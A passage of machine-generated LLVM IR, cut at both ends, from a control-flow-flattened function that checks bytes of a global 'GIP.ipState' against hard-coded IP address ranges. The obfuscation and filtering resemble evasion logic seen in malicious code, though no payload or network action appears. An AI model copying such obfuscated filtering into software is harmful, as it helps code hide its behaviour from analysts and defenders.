  %2285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2286 = zext i8 %2285 to i32
  %2287 = icmp sge i32 %2286, 208
  %2288 = select i1 %2287, i32 1451148702, i32 1209542726
  store i32 %2288, i32* %switchVar
  br label %loopEnd

; <label>:2289:                                   ; preds = %loopEntry
  %2290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2291 = zext i8 %2290 to i32
  %2292 = icmp slt i32 %2291, 223
  %2293 = select i1 %2292, i32 -886816699, i32 1209542726
  store i32 %2293, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2294:                                   ; preds = %loopEntry
  %2295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2296 = zext i8 %2295 to i32
  %2297 = icmp eq i32 %2296, 192
  %2298 = select i1 %2297, i32 223475622, i32 -1262083526
  store i32 %2298, i32* %switchVar
  br label %loopEnd

; <label>:2299:                                   ; preds = %loopEntry
  %2300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2301 = zext i8 %2300 to i32
  %2302 = icmp eq i32 %2301, 40
  %2303 = select i1 %2302, i32 -409899032, i32 -1262083526
  store i32 %2303, i32* %switchVar
  br label %loopEnd

; <label>:2304:                                   ; preds = %loopEntry
  %2305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2306 = zext i8 %2305 to i32
  %2307 = icmp sge i32 %2306, 56
  %2308 = select i1 %2307, i32 799709604, i32 -1262083526
  store i32 %2308, i32* %switchVar
  br label %loopEnd

; <label>:2309:                                   ; preds = %loopEntry
  %2310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2311 = zext i8 %2310 to i32
  %2312 = icmp slt i32 %2311, 59
  %2313 = select i1 %2312, i32 -886816699, i32 -1262083526
  store i32 %2313, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2314:                                   ; preds = %loopEntry
  %2315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2316 = zext i8 %2315 to i32
  %2317 = icmp eq i32 %2316, 198
  %2318 = select i1 %2317, i32 -501378514, i32 2111953819
  store i32 %2318, i32* %switchVar
  br label %loopEnd

; <label>:2319:                                   ; preds = %loopEntry
  %2320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2321 = zext i8 %2320 to i32
  %2322 = icmp eq i32 %2321, 8
  %2323 = select i1 %2322, i32 -375978761, i32 2111953819
  store i32 %2323, i32* %switchVar
  br label %loopEnd

; <label>:2324:                                   ; preds = %loopEntry
  %2325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2326 = zext i8 %2325 to i32
  %2327 = icmp sge i32 %2326, 81
  %2328 = select i1 %2327, i32 829110966, i32 2111953819
  store i32 %2328, i32* %switchVar
  br label %loopEnd

; <label>:2329:                                   ; preds = %loopEntry
  %2330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2331 = zext i8 %2330 to i32
  %2332 = icmp slt i32 %2331, 95
  %2333 = select i1 %2332, i32 -886816699, i32 2111953819
  store i32 %2333, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2334:                                   ; preds = %loopEntry
  %2335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2336 = zext i8 %2335 to i32
  %2337 = icmp eq i32 %2336, 199
  %2338 = select i1 %2337, i32 387412674, i32 1166655650
  store i32 %2338, i32* %switchVar
  br label %loopEnd

; <label>:2339:                                   ; preds = %loopEntry
  %2340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2341 = zext i8 %2340 to i32
  %2342 = icmp eq i32 %2341, 116
  %2343 = select i1 %2342, i32 1599445615, i32 1166655650
  store i32 %2343, i32* %switchVar
  br label %loopEnd

; <label>:2344:                                   ; preds = %loopEntry
  %2345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2346 = zext i8 %2345 to i32
  %2347 = icmp sge i32 %2346, 112
  %2348 = select i1 %2347, i32 -2117533357, i32 1166655650
  store i32 %2348, i32* %switchVar
  br label %loopEnd

; <label>:2349:                                   ; preds = %loopEntry
  %2350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2351 = zext i8 %2350 to i32
  %2352 = icmp slt i32 %2351, 119
  %2353 = select i1 %2352, i32 -886816699, i32 1166655650
  store i32 %2353, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2354:                                   ; preds = %loopEntry
  %2355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2356 = zext i8 %2355 to i32
  %2357 = icmp eq i32 %2356, 199
  %2358 = select i1 %2357, i32 1876474646, i32 614034241
  store i32 %2358, i32* %switchVar
  br label %loopEnd

; <label>:2359:                                   ; preds = %loopEntry
  %2360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2361 = zext i8 %2360 to i32
  %2362 = icmp eq i32 %2361, 229
  %2363 = select i1 %2362, i32 -501755829, i32 614034241
  store i32 %2363, i32* %switchVar
  br label %loopEnd

; <label>:2364:                                   ; preds = %loopEntry
  %2365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2366 = zext i8 %2365 to i32
  %2367 = icmp sge i32 %2366, 248
  %2368 = select i1 %2367, i32 864579874, i32 614034241
  store i32 %2368, i32* %switchVar
  br label %loopEnd

; <label>:2369:                                   ; preds = %loopEntry
  %2370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2371 = zext i8 %2370 to i32
  %2372 = icmp slt i32 %2371, 255
  %2373 = select i1 %2372, i32 -886816699, i32 614034241
  store i32 %2373, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2374:                                   ; preds = %loopEntry
  %2375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2376 = zext i8 %2375 to i32
  %2377 = icmp eq i32 %2376, 199
  %2378 = select i1 %2377, i32 1909435926, i32 1108135513
  store i32 %2378, i32* %switchVar
  br label %loopEnd

; <label>:2379:                                   ; preds = %loopEntry
  %2380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2381 = zext i8 %2380 to i32
  %2382 = icmp eq i32 %2381, 36
  %2383 = select i1 %2382, i32 1733620159, i32 1108135513
  store i32 %2383, i32* %switchVar
  br label %loopEnd

; <label>:2384:                                   ; preds = %loopEntry
  %2385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2386 = zext i8 %2385 to i32
  %2387 = icmp sge i32 %2386, 220
  %2388 = select i1 %2387, i32 507830579, i32 1108135513
  store i32 %2388, i32* %switchVar
  br label %loopEnd

; <label>:2389:                                   ; preds = %loopEntry
  %2390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2391 = zext i8 %2390 to i32
  %2392 = icmp slt i32 %2391, 223
  %2393 = select i1 %2392, i32 -886816699, i32 1108135513
  store i32 %2393, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2394:                                   ; preds = %loopEntry
  %2395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2396 = zext i8 %2395 to i32
  %2397 = icmp eq i32 %2396, 199
  %2398 = select i1 %2397, i32 -1710933011, i32 1301939047
  store i32 %2398, i32* %switchVar
  br label %loopEnd

; <label>:2399:                                   ; preds = %loopEntry
  %2400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2401 = zext i8 %2400 to i32
  %2402 = icmp eq i32 %2401, 58
  %2403 = select i1 %2402, i32 -856281815, i32 1301939047
  store i32 %2403, i32* %switchVar
  br label %loopEnd

; <label>:2404:                                   ; preds = %loopEntry
  %2405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2406 = zext i8 %2405 to i32
  %2407 = icmp sge i32 %2406, 184
  %2408 = select i1 %2407, i32 1667317108, i32 1301939047
  store i32 %2408, i32* %switchVar
  br label %loopEnd

; <label>:2409:                                   ; preds = %loopEntry
  %2410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2411 = zext i8 %2410 to i32
  %2412 = icmp slt i32 %2411, 187
  %2413 = select i1 %2412, i32 -886816699, i32 1301939047
  store i32 %2413, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2414:                                   ; preds = %loopEntry
  %2415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2416 = zext i8 %2415 to i32
  %2417 = icmp eq i32 %2416, 206
  %2418 = select i1 %2417, i32 1383024232, i32 210699400
  store i32 %2418, i32* %switchVar
  br label %loopEnd

; <label>:2419:                                   ; preds = %loopEntry
  %2420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2421 = zext i8 %2420 to i32
  %2422 = icmp eq i32 %2421, 220
  %2423 = select i1 %2422, i32 -2111726846, i32 210699400
  store i32 %2423, i32* %switchVar
  br label %loopEnd

; <label>:2424:                                   ; preds = %loopEntry
  %2425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2426 = zext i8 %2425 to i32
  %2427 = icmp sge i32 %2426, 172
  %2428 = select i1 %2427, i32 -2145965761, i32 210699400
  store i32 %2428, i32* %switchVar
  br label %loopEnd

; <label>:2429:                                   ; preds = %loopEntry
  %2430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2431 = zext i8 %2430 to i32
  %2432 = icmp slt i32 %2431, 175
  %2433 = select i1 %2432, i32 -886816699, i32 210699400
  store i32 %2433, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2434:                                   ; preds = %loopEntry
  %2435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2436 = zext i8 %2435 to i32
  %2437 = icmp eq i32 %2436, 208
  %2438 = select i1 %2437, i32 1721143117, i32 -25928155
  store i32 %2438, i32* %switchVar
  br label %loopEnd

; <label>:2439:                                   ; preds = %loopEntry
  %2440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2441 = zext i8 %2440 to i32
  %2442 = icmp eq i32 %2441, 78
  %2443 = select i1 %2442, i32 984224837, i32 -25928155
  store i32 %2443, i32* %switchVar
  br label %loopEnd

; <label>:2444:                                   ; preds = %loopEntry
  %2445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2446 = zext i8 %2445 to i32
  %2447 = icmp sge i32 %2446, 40
  %2448 = select i1 %2447, i32 -1095244921, i32 -25928155
  store i32 %2448, i32* %switchVar
  br label %loopEnd

; <label>:2449:                                   ; preds = %loopEntry
  %2450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2451 = zext i8 %2450 to i32
  %2452 = icmp slt i32 %2451, 43
  %2453 = select i1 %2452, i32 -886816699, i32 -25928155
  store i32 %2453, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2454:                                   ; preds = %loopEntry
  %2455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2456 = zext i8 %2455 to i32
  %2457 = icmp eq i32 %2456, 208
  %2458 = select i1 %2457, i32 -1236947685, i32 1085889764
  store i32 %2458, i32* %switchVar
  br label %loopEnd

; <label>:2459:                                   ; preds = %loopEntry
  %2460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2461 = zext i8 %2460 to i32
  %2462 = icmp eq i32 %2461, 93
  %2463 = select i1 %2462, i32 -1387064157, i32 1085889764
  store i32 %2463, i32* %switchVar
  br label %loopEnd

; <label>:2464:                                   ; preds = %loopEntry
  %2465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2466 = zext i8 %2465 to i32
  %2467 = icmp sge i32 %2466, 192
  %2468 = select i1 %2467, i32 659263239, i32 1085889764
  store i32 %2468, i32* %switchVar
  br label %loopEnd

; <label>:2469:                                   ; preds = %loopEntry
  %2470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2471 = zext i8 %2470 to i32
  %2472 = icmp slt i32 %2471, 193
  %2473 = select i1 %2472, i32 -886816699, i32 1085889764
  store i32 %2473, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2474:                                   ; preds = %loopEntry
  %2475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2476 = zext i8 %2475 to i32
  %2477 = icmp eq i32 %2476, 66
  %2478 = select i1 %2477, i32 1974359221, i32 94427311
  store i32 %2478, i32* %switchVar
  br label %loopEnd

; <label>:2479:                                   ; preds = %loopEntry
  %2480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2481 = zext i8 %2480 to i32
  %2482 = icmp eq i32 %2481, 71
  %2483 = select i1 %2482, i32 324794200, i32 94427311
  store i32 %2483, i32* %switchVar
  br label %loopEnd

; <label>:2484:                                   ; preds = %loopEntry
  %2485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2486 = zext i8 %2485 to i32
  %2487 = icmp sge i32 %2486, 240
  %2488 = select i1 %2487, i32 -1293943700, i32 94427311
  store i32 %2488, i32* %switchVar
  br label %loopEnd

; <label>:2489:                                   ; preds = %loopEntry
  %2490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2491 = zext i8 %2490 to i32
  %2492 = icmp slt i32 %2491, 255
  %2493 = select i1 %2492, i32 -886816699, i32 94427311
  store i32 %2493, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2494:                                   ; preds = %loopEntry
  %2495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2496 = zext i8 %2495 to i32
  %2497 = icmp eq i32 %2496, 98
  %2498 = select i1 %2497, i32 -1856916229, i32 1785949759
  store i32 %2498, i32* %switchVar
  br label %loopEnd

; <label>:2499:                                   ; preds = %loopEntry
  %2500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2501 = zext i8 %2500 to i32
  %2502 = icmp eq i32 %2501, 142
  %2503 = select i1 %2502, i32 1506945336, i32 1785949759
  store i32 %2503, i32* %switchVar
  br label %loopEnd

; <label>:2504:                                   ; preds = %loopEntry
  %2505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2506 = zext i8 %2505 to i32
  %2507 = icmp sge i32 %2506, 208
  %2508 = select i1 %2507, i32 437883812, i32 1785949759
  store i32 %2508, i32* %switchVar
  br label %loopEnd

; <label>:2509:                                   ; preds = %loopEntry
  %2510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2511 = zext i8 %2510 to i32
  %2512 = icmp slt i32 %2511, 223
  %2513 = select i1 %2512, i32 -886816699, i32 1785949759
  store i32 %2513, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2514:                                   ; preds = %loopEntry
  %2515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2516 = zext i8 %2515 to i32
  %2517 = icmp eq i32 %2516, 107
  %2518 = select i1 %2517, i32 -1904761231, i32 391488696
  store i32 %2518, i32* %switchVar
  br label %loopEnd

; <label>:2519:                                   ; preds = %loopEntry
  %2520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2521 = zext i8 %2520 to i32
  %2522 = icmp sge i32 %2521, 20
  %2523 = select i1 %2522, i32 970850461, i32 391488696
  store i32 %2523, i32* %switchVar
  br label %loopEnd

; <label>:2524:                                   ; preds = %loopEntry
  %2525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2526 = zext i8 %2525 to i32
  %2527 = icmp slt i32 %2526, 24
  %2528 = select i1 %2527, i32 -886816699, i32 391488696
  store i32 %2528, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2529:                                   ; preds = %loopEntry
  %2530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2531 = zext i8 %2530 to i32
  %2532 = icmp eq i32 %2531, 35
  %2533 = select i1 %2532, i32 409996118, i32 -809227982
  store i32 %2533, i32* %switchVar
  br label %loopEnd

; <label>:2534:                                   ; preds = %loopEntry
  %2535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2536 = zext i8 %2535 to i32
  %2537 = icmp sge i32 %2536, 159
  %2538 = select i1 %2537, i32 -465261213, i32 -809227982
  store i32 %2538, i32* %switchVar
  br label %loopEnd

; <label>:2539:                                   ; preds = %loopEntry
  %2540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2541 = zext i8 %2540 to i32
  %2542 = icmp slt i32 %2541, 183
  %2543 = select i1 %2542, i32 -886816699, i32 -809227982
  store i32 %2543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2544:                                   ; preds = %loopEntry
  %2545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2546 = zext i8 %2545 to i32
  %2547 = icmp eq i32 %2546, 52
  %2548 = select i1 %2547, i32 -734591421, i32 -213188855
  store i32 %2548, i32* %switchVar
  br label %loopEnd

; <label>:2549:                                   ; preds = %loopEntry
  %2550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2551 = zext i8 %2550 to i32
  %2552 = icmp sge i32 %2551, 1
  %2553 = select i1 %2552, i32 -785732460, i32 -213188855
  store i32 %2553, i32* %switchVar
  br label %loopEnd

; <label>:2554:                                   ; preds = %loopEntry
  %2555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2556 = zext i8 %2555 to i32
  %2557 = icmp slt i32 %2556, 95
  %2558 = select i1 %2557, i32 -886816699, i32 -213188855
  store i32 %2558, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2559:                                   ; preds = %loopEntry
  %2560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2561 = zext i8 %2560 to i32
  %2562 = icmp eq i32 %2561, 52
  %2563 = select i1 %2562, i32 -40970527, i32 1781108717
  store i32 %2563, i32* %switchVar
  br label %loopEnd

; <label>:2564:                                   ; preds = %loopEntry
  %2565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2566 = zext i8 %2565 to i32
  %2567 = icmp sge i32 %2566, 95
  %2568 = select i1 %2567, i32 -1598958258, i32 1781108717
  store i32 %2568, i32* %switchVar
  br label %loopEnd

; <label>:2569:                                   ; preds = %loopEntry
  %2570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2571 = zext i8 %2570 to i32
  %2572 = icmp slt i32 %2571, 255
  %2573 = select i1 %2572, i32 -886816699, i32 1781108717
  store i32 %2573, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2574:                                   ; preds = %loopEntry
  %2575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2576 = zext i8 %2575 to i32
  %2577 = icmp eq i32 %2576, 54
  %2578 = select i1 %2577, i32 494916618, i32 -2074058163
  store i32 %2578, i32* %switchVar
  br label %loopEnd

; <label>:2579:                                   ; preds = %loopEntry
  %2580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2581 = zext i8 %2580 to i32
  %2582 = icmp sge i32 %2581, 64
  %2583 = select i1 %2582, i32 503183041, i32 -2074058163
  store i32 %2583, i32* %switchVar
  br label %loopEnd

; <label>:2584:                                   ; preds = %loopEntry
  %2585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2586 = zext i8 %2585 to i32
  %2587 = icmp slt i32 %2586, 95
  %2588 = select i1 %2587, i32 -886816699, i32 -2074058163
  store i32 %2588, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  %2590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2591 = zext i8 %2590 to i32
  %2592 = icmp eq i32 %2591, 54
  %2593 = select i1 %2592, i32 -1188547272, i32 871584568
  store i32 %2593, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  %2595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2596 = zext i8 %2595 to i32
  %2597 = icmp sge i32 %2596, 144
  %2598 = select i1 %2597, i32 1444566182, i32 871584568
  store i32 %2598, i32* %switchVar
  br label %loopEnd

; <label>:2599:                                   ; preds = %loopEntry
  %2600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2601 = zext i8 %2600 to i32
  %2602 = icmp slt i32 %2601, 255
  %2603 = select i1 %2602, i32 -886816699, i32 871584568
  store i32 %2603, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2604:                                   ; preds = %loopEntry
  %2605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2606 = zext i8 %2605 to i32
  %2607 = icmp eq i32 %2606, 13
  %2608 = select i1 %2607, i32 1820931261, i32 323296982
  store i32 %2608, i32* %switchVar
  br label %loopEnd

; <label>:2609:                                   ; preds = %loopEntry
  %2610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2611 = zext i8 %2610 to i32
  %2612 = icmp sge i32 %2611, 52
  %2613 = select i1 %2612, i32 -2023636276, i32 323296982
  store i32 %2613, i32* %switchVar
  br label %loopEnd

; <label>:2614:                                   ; preds = %loopEntry
  %2615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2616 = zext i8 %2615 to i32
  %2617 = icmp slt i32 %2616, 60
  %2618 = select i1 %2617, i32 -886816699, i32 323296982
  store i32 %2618, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2619:                                   ; preds = %loopEntry
  %2620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2621 = zext i8 %2620 to i32
  %2622 = icmp eq i32 %2621, 13
  %2623 = select i1 %2622, i32 1395046445, i32 843285505
  store i32 %2623, i32* %switchVar
  br label %loopEnd

; <label>:2624:                                   ; preds = %loopEntry
  %2625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2626 = zext i8 %2625 to i32
  %2627 = icmp sge i32 %2626, 112
  %2628 = select i1 %2627, i32 -1011085733, i32 843285505
  store i32 %2628, i32* %switchVar
  br label %loopEnd

; <label>:2629:                                   ; preds = %loopEntry
  %2630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2631 = zext i8 %2630 to i32
  %2632 = icmp slt i32 %2631, 115
  %2633 = select i1 %2632, i32 -886816699, i32 843285505
  store i32 %2633, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2634:                                   ; preds = %loopEntry
  %2635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2636 = zext i8 %2635 to i32
  %2637 = icmp eq i32 %2636, 163
  %2638 = select i1 %2637, i32 -1363542903, i32 -996195249
  store i32 %2638, i32* %switchVar
  br label %loopEnd

; <label>:2639:                                   ; preds = %loopEntry
  %2640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2641 = zext i8 %2640 to i32
  %2642 = icmp eq i32 %2641, 172
  %2643 = select i1 %2642, i32 -886816699, i32 -996195249
  store i32 %2643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2644:                                   ; preds = %loopEntry
  %2645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2646 = zext i8 %2645 to i32
  %2647 = icmp eq i32 %2646, 51
  %2648 = select i1 %2647, i32 -651551348, i32 -147541415
  store i32 %2648, i32* %switchVar
  br label %loopEnd

; <label>:2649:                                   ; preds = %loopEntry
  %2650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2651 = zext i8 %2650 to i32
  %2652 = icmp sge i32 %2651, 15
  %2653 = select i1 %2652, i32 -2106984131, i32 -147541415
  store i32 %2653, i32* %switchVar
  br label %loopEnd

; <label>:2654:                                   ; preds = %loopEntry
  %2655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2656 = zext i8 %2655 to i32
  %2657 = icmp slt i32 %2656, 255
  %2658 = select i1 %2657, i32 -886816699, i32 -147541415
  store i32 %2658, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2659:                                   ; preds = %loopEntry
  %2660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2661 = zext i8 %2660 to i32
  %2662 = icmp eq i32 %2661, 79
  %2663 = select i1 %2662, i32 1559369942, i32 -318161342
  store i32 %2663, i32* %switchVar
  br label %loopEnd

; <label>:2664:                                   ; preds = %loopEntry
  %2665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2666 = zext i8 %2665 to i32
  %2667 = icmp eq i32 %2666, 121
  %2668 = select i1 %2667, i32 -75947670, i32 -318161342
  store i32 %2668, i32* %switchVar
  br label %loopEnd

; <label>:2669:                                   ; preds = %loopEntry
  %2670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2671 = zext i8 %2670 to i32
  %2672 = icmp sge i32 %2671, 128
  %2673 = select i1 %2672, i32 -888473219, i32 -318161342
  store i32 %2673, i32* %switchVar
  br label %loopEnd

; <label>:2674:                                   ; preds = %loopEntry
  %2675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2676 = zext i8 %2675 to i32
  %2677 = icmp slt i32 %2676, 255
  %2678 = select i1 %2677, i32 -886816699, i32 -318161342
  store i32 %2678, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2679:                                   ; preds = %loopEntry
  %2680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2681 = zext i8 %2680 to i32
  %2682 = icmp eq i32 %2681, 212
  %2683 = select i1 %2682, i32 2104312144, i32 1009109019
  store i32 %2683, i32* %switchVar
  br label %loopEnd

; <label>:2684:                                   ; preds = %loopEntry
